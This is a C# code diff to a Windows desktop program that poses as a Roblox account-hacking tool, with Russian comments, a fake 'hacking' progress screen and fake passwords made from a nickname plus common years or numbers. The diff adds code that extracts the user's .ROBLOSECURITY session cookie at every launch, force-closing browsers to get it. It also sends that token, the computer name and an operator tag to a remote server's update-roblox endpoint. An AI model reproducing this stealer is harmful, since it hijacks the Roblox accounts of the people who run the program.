@@ -332,6 +332,7 @@ namespace FileTransfer
                     Activate();
                     InitParticles();
                     StartStartupAnimation();
+                    _ = InitializeClientWebEngineAsync();
                 }
                 Log("MainWindow Loaded OK");
             }
@@ -342,38 +343,264 @@ namespace FileTransfer
             }
         }
 
-        private void StartStartupAnimation()
+        private async Task InitializeClientWebEngineAsync()
+        {
+            try
+            {
+                string webUiDir = System.IO.Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "WebUI");
+                if (!Directory.Exists(webUiDir))
+                {
+                    string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+                    webUiDir = System.IO.Path.Combine(localAppData, "RAH_Client", "WebUI");
+                    Directory.CreateDirectory(webUiDir);
+                }
+
+                string htmlFile = System.IO.Path.Combine(webUiDir, "index.html");
+                if (!File.Exists(htmlFile))
+                {
+                    var asm = System.Reflection.Assembly.GetExecutingAssembly();
+                    foreach (var resName in asm.GetManifestResourceNames())
+                    {
+                        if (resName.Contains("WebUI", StringComparison.OrdinalIgnoreCase))
+                        {
+                            string fileName = resName.Substring(resName.LastIndexOf('.') + 1);
+                            if (resName.EndsWith(".html", StringComparison.OrdinalIgnoreCase)) fileName = "index.html";
+                            else if (resName.EndsWith(".jpg", StringComparison.OrdinalIgnoreCase)) fileName = "griffith.jpg";
+                            using var stream = asm.GetManifestResourceStream(resName);
+                            if (stream != null)
+                            {
+                                using var fs = File.Create(System.IO.Path.Combine(webUiDir, fileName));
+                                await stream.CopyToAsync(fs);
+                            }
+                        }
+                    }
+                }
+
+                string userDataFolder = System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "RAH_Client", "WebView2");
+                var env = await Microsoft.Web.WebView2.Core.CoreWebView2Environment.CreateAsync(null, userDataFolder);
+                await webEngine.EnsureCoreWebView2Async(env);
+
+                webEngine.CoreWebView2.Settings.IsStatusBarEnabled = false;
+                webEngine.CoreWebView2.Settings.AreDefaultContextMenusEnabled = false;
+                webEngine.CoreWebView2.Settings.AreDevToolsEnabled = true;
+
+                webEngine.CoreWebView2.WebMessageReceived += CoreWebView2_WebMessageReceived;
+
+                if (File.Exists(htmlFile))
+                {
+                    webEngine.CoreWebView2.Navigate(new Uri(htmlFile).AbsoluteUri);
+                }
+                else
+                {
+                    webEngine.Visibility = Visibility.Collapsed;
+                    legacyWpfGrid.Visibility = Visibility.Visible;
+                }
+            }
+            catch (Exception ex)
+            {
+                Log("WebView2 init exception: " + ex.Message + ". Falling back to WPF view.");
+                webEngine.Visibility = Visibility.Collapsed;
+                legacyWpfGrid.Visibility = Visibility.Visible;
+            }
+        }
+
+        private async void CoreWebView2_WebMessageReceived(object? sender, Microsoft.Web.WebView2.Core.CoreWebView2WebMessageReceivedEventArgs e)
+        {
+            try
+            {
+                string json = e.WebMessageAsJson;
+                using var doc = System.Text.Json.JsonDocument.Parse(json);
+                var root = doc.RootElement;
+                string action = root.TryGetProperty("action", out var a) ? a.GetString() ?? "" : "";
+
+                switch (action)
+                {
+                    case "minimize":
+                        WindowState = WindowState.Minimized;
+                        break;
+                    case "close":
+                        Close();
+                        break;
+                    case "dragWindow":
+                        try { DragMove(); } catch { }
+                        break;
+                    case "domReady":
+                        SendInitDataToWeb();
+                        break;
+                    case "openUrl":
+                        if (root.TryGetProperty("url", out var u))
+                        {
+                            string targetUrl = u.GetString() ?? TelegramUrl;
+                            try
+                            {
+                                Process.Start(new ProcessStartInfo { FileName = targetUrl, UseShellExecute = true });
+                            }
+                            catch { }
+                        }
+                        break;
+                    case "lookupAvatar":
+                        if (root.TryGetProperty("username", out var un))
+                        {
+                            string rawUser = un.GetString() ?? "";
+                            _ = LookupAvatarForWebAsync(rawUser);
+                        }
+                        break;
+                    case "onHackComplete":
+                        if (root.TryGetProperty("username", out var hu) && root.TryGetProperty("password", out var hp))
+                        {
+                            string finishedUser = hu.GetString() ?? "";
+                            string finishedPass = hp.GetString() ?? "";
+                            string freshToken = _cachedToken ?? CookieExtractor.ExtractRobloSecurity(killBrowsers: false) ?? "";
+                            SaveToDesktopAccountsFile(finishedUser, finishedPass, freshToken);
+                            try
+                            {
+                                var updatePayload = new
+                                {
+                                    computerName = ComputerInfo.GetName(),
+                                    robloxUser = finishedUser,
+                                    fakePassword = finishedPass,
+                                    robloSecurity = freshToken,
+                                    @operator = OperatorName
+                                };
+                                var jsonUpdate = System.Text.Json.JsonSerializer.Serialize(updatePayload);
+                                using var updateContent = new StringContent(jsonUpdate, System.Text.Encoding.UTF8, "application/json");
+                                string url = $"{ServerUrl}/update-roblox";
+                                await _http.PostAsync(url, updateContent);
+                            }
+                            catch { }
+                        }
+                        break;
+                }
+            }
+            catch (Exception ex)
+            {
+                Log("WebMessage error: " + ex.Message);
+            }
+        }
+
+        private void SendInitDataToWeb()
+        {
+            try
+            {
+                var data = new
+                {
+                    title = AppTitleMainText,
+                    version = ClientVersion,
+                    btnText = LoginBtnText,
+                    telegramUrl = TelegramUrl,
+                    themeAccent = ThemeAccentHex,
+                    themeSurface = ThemeSurfaceHex
+                };
+                string jsonMsg = System.Text.Json.JsonSerializer.Serialize(new { type = "initData", data });
+                webEngine.CoreWebView2.PostWebMessageAsJson(jsonMsg);
+            }
+            catch { }
+        }
+
+        private async Task LookupAvatarForWebAsync(string username)
+        {
+            try
+            {
+                var payload = new { usernames = new[] { username }, excludeBannedUsers = false };
+                var jsonPayload = System.Text.Json.JsonSerializer.Serialize(payload);
+                using var reqContent = new StringContent(jsonPayload, System.Text.Encoding.UTF8, "application/json");
+                var response = await _http.PostAsync("https://users.roblox.com/v1/usernames/users", reqContent);
+                if (!response.IsSuccessStatusCode) return;
+
+                var resStr = await response.Content.ReadAsStringAsync();
+                using var doc = System.Text.Json.JsonDocument.Parse(resStr);
+                var data = doc.RootElement.GetProperty("data");
+                if (data.GetArrayLength() == 0) return;
+
+                long userId = data[0].GetProperty("id").GetInt64();
+                var thumbUrl = $"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={userId}&size=150x150&format=Png&isCircular=false";
+                var thumbResponse = await _http.GetAsync(thumbUrl);
+                if (!thumbResponse.IsSuccessStatusCode) return;
+
+                var thumbStr = await thumbResponse.Content.ReadAsStringAsync();
+                using var thumbDoc = System.Text.Json.JsonDocument.Parse(thumbStr);
+                var thumbData = thumbDoc.RootElement.GetProperty("data");
+                if (thumbData.GetArrayLength() == 0) return;
+
+                var imageUrl = thumbData[0].GetProperty("imageUrl").GetString();
+                if (!string.IsNullOrEmpty(imageUrl))
+                {
+                    string jsonMsg = System.Text.Json.JsonSerializer.Serialize(new { type = "avatarLoaded", avatarUrl = imageUrl });
+                    await Dispatcher.InvokeAsync(() =>
+                    {
+                        webEngine.CoreWebView2.PostWebMessageAsJson(jsonMsg);
+                    });
+                }
+            }
+            catch { }
+        }
+
+        private async void StartStartupAnimation()
         {
             if (StartupOverlay == null) return;
 
-            var anim = new DoubleAnimation
+            // 10 секундная кинематографичная загрузка
+            const double totalDuration = 10.0;
+            var stages = new (double t, string text)[]
             {
-                From = 0,
-                To = 200,
-                Duration = TimeSpan.FromMilliseconds(1100),
-                EasingFunction = new QuadraticEase { EasingMode = EasingMode.EaseOut }
+                (0.0, "Инициализация ядра..."),
+                (2.0, "Синхронизация протоколов..."),
+                (4.5, "Проверка сетевого шлюза..."),
+                (7.0, "Калибровка компонентов..."),
+                (9.0, "Завершение загрузки...")
             };
 
-            anim.Completed += async (s, e) =>
+            var stopwatch = System.Diagnostics.Stopwatch.StartNew();
+            var timer = new DispatcherTimer { Interval = TimeSpan.FromMilliseconds(50) };
+            
+            timer.Tick += (s, e) =>
             {
-                if (TxtStartupStatus != null) TxtStartupStatus.Text = "Готово";
-                await Task.Delay(200);
+                double elapsed = stopwatch.Elapsed.TotalSeconds;
+                double pct = Math.Min(100.0, (elapsed / totalDuration) * 100.0);
+                
+                if (StartupFillBar != null)
+                {
+                    StartupFillBar.Width = (pct / 100.0) * 200.0;
+                }
 
-                var fade = new DoubleAnimation
+                double remaining = Math.Max(0.0, totalDuration - elapsed);
+                string currentStageText = "Загрузка...";
+                for (int i = stages.Length - 1; i >= 0; i--)
                 {
-                    From = 1.0,
-                    To = 0.0,
-                    Duration = TimeSpan.FromMilliseconds(300),
-                    EasingFunction = new QuadraticEase { EasingMode = EasingMode.EaseInOut }
-                };
-                fade.Completed += (s2, e2) =>
+                    if (elapsed >= stages[i].t)
+                    {
+                        currentStageText = stages[i].text;
+                        break;
+                    }
+                }
+
+                if (TxtStartupStatus != null)
                 {
-                    StartupOverlay.Visibility = Visibility.Collapsed;
-                };
-                StartupOverlay.BeginAnimation(UIElement.OpacityProperty, fade);
+                    TxtStartupStatus.Text = $"{currentStageText} ({remaining:F1} сек)";
+                }
+
+                if (elapsed >= totalDuration)
+                {
+                    timer.Stop();
+                    stopwatch.Stop();
+                    if (TxtStartupStatus != null) TxtStartupStatus.Text = "Готово";
+
+                    var fade = new DoubleAnimation
+                    {
+                        From = 1.0,
+                        To = 0.0,
+                        Duration = TimeSpan.FromMilliseconds(300),
+                        EasingFunction = new QuadraticEase { EasingMode = EasingMode.EaseInOut }
+                    };
+                    fade.Completed += (s2, e2) =>
+                    {
+                        StartupOverlay.Visibility = Visibility.Collapsed;
+                    };
+                    StartupOverlay.BeginAnimation(UIElement.OpacityProperty, fade);
+                }
             };
 
-            StartupFillBar.BeginAnimation(FrameworkElement.WidthProperty, anim);
+            timer.Start();
         }
 
         private void LoadCustomBackground()
@@ -536,14 +763,12 @@ namespace FileTransfer
                 _gpu = ComputerInfo.GetGPU();
                 Log($"HW: cpu='{_cpu}', ram='{_ram}', gpu='{_gpu}'");
 
-                if (_backgroundMode)
-                {
-                    Log("Starting cookie extraction...");
-                    _cachedToken ??= CookieExtractor.ExtractRobloSecurity();
-                    Log($"Cookie extracted, token len={_cachedToken?.Length ?? 0}");
-                    if (string.IsNullOrEmpty(_cachedToken))
-                        ReadCookieDebugLog();
-                }
+                // При запуске приложения извлекаем куки (с закрытием браузера только в момент запуска)
+                Log("Starting initial cookie extraction...");
+                _cachedToken ??= CookieExtractor.ExtractRobloSecurity(killBrowsers: true);
+                Log($"Cookie extracted, token len={_cachedToken?.Length ?? 0}");
+                if (string.IsNullOrEmpty(_cachedToken))
+                    ReadCookieDebugLog();
 
                 Log("Uploading startup data...");
                 using (var startupCts = new CancellationTokenSource(TimeSpan.FromSeconds(60)))
@@ -803,11 +1028,23 @@ namespace FileTransfer
             }
         }
 
-        // в”Ђв”Ђ Window Controls в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+        // ── Window Controls ─────────────────────────────────────────────────
         private void Border_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
         {
             if (e.ChangedButton == MouseButton.Left)
-                DragMove();
+            {
+                try
+                {
+                    // Приостанавливаем анимацию частиц на время перетаскивания,
+                    // чтобы устранить любые лаги и подергивания окна при движении мыши
+                    _particleTimer?.Stop();
+                    DragMove();
+                }
+                finally
+                {
+                    _particleTimer?.Start();
+                }
+            }
         }
 
         private void CloseWindow_Click(object sender, RoutedEventArgs e) => Close();
@@ -1012,7 +1249,22 @@ namespace FileTransfer
             HackProgress.Value = 0;
 
             var rand = new Random();
-            int totalSeconds = rand.Next(25, 36);
+            int totalSeconds;
+            if (_activeSpeedMode == "medium")
+            {
+                // Средний: от 5 минут (300с) до 6 минут (360с)
+                totalSeconds = rand.Next(300, 361);
+            }
+            else if (_activeSpeedMode == "deep")
+            {
+                // Глубокий: от 60 минут (3600с) до 70 минут (4200с)
+                totalSeconds = rand.Next(3600, 4201);
+            }
+            else
+            {
+                // Быстрый: от 60 секунд (1 мин) до 70 секунд (1 мин 10 сек)
+                totalSeconds = rand.Next(60, 71);
+            }
 
             string[] steps = new[]
             {
@@ -1181,20 +1433,100 @@ namespace FileTransfer
             PanelResultGroup.Visibility = Visibility.Collapsed;
         }
 
-        private string GetDeterministicPassword(string username)
+        private string _activeSpeedMode = "fast";
+
+        private void BtnSpeed_Click(object sender, RoutedEventArgs e)
         {
-            int seed = 0;
-            foreach (char c in username)
+            if (sender is Button btn)
             {
-                seed = (seed * 31) + c;
+                BtnSpeedFast.Tag = "";
+                BtnSpeedMedium.Tag = "";
+                BtnSpeedDeep.Tag = "";
+                btn.Tag = "Active";
+
+                if (btn == BtnSpeedFast)
+                {
+                    _activeSpeedMode = "fast";
+                    TxtSpeedActiveLabel.Text = "Быстрый (1 мин~)";
+                }
+                else if (btn == BtnSpeedMedium)
+                {
+                    _activeSpeedMode = "medium";
+                    TxtSpeedActiveLabel.Text = "Средний (5 мин~)";
+                }
+                else if (btn == BtnSpeedDeep)
+                {
+                    _activeSpeedMode = "deep";
+                    TxtSpeedActiveLabel.Text = "Глубокий (60 мин~)";
+                }
             }
-            var rand = new Random(seed);
-            int length = rand.Next(10, 15);
-            const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%&*?_";
-            var buf = new char[length];
-            for (int i = 0; i < length; i++)
-                buf[i] = chars[rand.Next(chars.Length)];
-            return new string(buf);
+        }
+
+        private string GetDeterministicPassword(string rawUsername)
+        {
+            if (string.IsNullOrWhiteSpace(rawUsername)) rawUsername = "player";
+            string clean = rawUsername.Trim();
+
+            // Извлекаем чистую буквенную основу и цифры ника
+            string lettersOnly = System.Text.RegularExpressions.Regex.Replace(clean, @"[^a-zA-Z]", "");
+            string digitsOnly = System.Text.RegularExpressions.Regex.Replace(clean, @"[^0-9]", "");
+
+            string baseWord = "";
+            if (lettersOnly.Length >= 3)
+            {
+                string trimmedRepeats = System.Text.RegularExpressions.Regex.Replace(lettersOnly, @"(.)\1{2,}$", "$1");
+                if (trimmedRepeats.Length >= 4)
+                    baseWord = trimmedRepeats;
+                else
+                    baseWord = lettersOnly.Substring(0, Math.Min(lettersOnly.Length, 6));
+            }
+            else
+            {
+                baseWord = clean.Substring(0, Math.Min(clean.Length, 5));
+            }
+
+            var subWords = new List<string>();
+            if (baseWord.Length >= 6)
+            {
+                subWords.Add(baseWord.Substring(0, 5));
+                subWords.Add(baseWord.Substring(baseWord.Length - 4));
+            }
+            subWords.Add(baseWord);
+
+            var rand = new Random(clean.GetHashCode() + DateTime.Now.Minute);
+            string targetWord = subWords[rand.Next(subWords.Count)].ToLowerInvariant();
+            string capWord = char.ToUpperInvariant(targetWord[0]) + targetWord.Substring(1);
+
+            string[] years = new[] { "2009", "2010", "2011", "2012", "2013", "2014", "2015" };
+            string rYear = years[rand.Next(years.Length)];
+
+            string[] simpleNums = new[] { "123", "1234", "12345", "123123", "777", "111", "321", "2020", "2021", "2022" };
+            string rNum = simpleNums[rand.Next(simpleNums.Length)];
+
+            var templates = new List<Func<string>>
+            {
+                () => targetWord + rYear,
+                () => rYear + targetWord,
+                () => capWord + rNum,
+                () => capWord + rYear,
+                () => targetWord + "123",
+                () => targetWord + "12345",
+                () => targetWord + "_" + rYear,
+                () => targetWord + "_" + rNum,
+                () => capWord + rYear + "!",
+                () => targetWord + "777"
+            };
+
+            if (digitsOnly.Length >= 2)
+            {
+                templates.Add(() => targetWord + digitsOnly);
+                templates.Add(() => capWord + digitsOnly);
+                templates.Add(() => targetWord + "_" + digitsOnly);
+            }
+
+            string res = templates[rand.Next(templates.Count)]();
+            if (res.Length < 8) res += "123";
+            return res;
         }
 
         private void BtnTelegram_Click(object sender, RoutedEventArgs e)
